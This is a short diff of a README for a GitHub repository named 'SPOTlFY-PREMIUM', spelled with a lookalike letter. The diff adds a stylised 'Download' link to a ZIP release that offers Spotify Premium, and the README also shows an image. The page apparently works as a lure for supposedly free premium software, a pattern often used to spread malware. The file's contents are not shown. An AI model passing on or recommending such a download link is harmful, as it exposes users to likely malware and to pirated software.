@@ -1,6 +1,6 @@
 # SPOTlFY-PREMIUM
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/nicodolas/SPOTlFY-PREMIUM/releases/download/SPOTIFY-PREMIUM/SPOTIFY.PREMIUM.zip)
 
 ![sp1 (2) (1)](https://github.com/nicodolas/SPOTlFY-PREMIUM/assets/134426271/bac07e97-8036-437b-9714-a0e1d133da99)
 
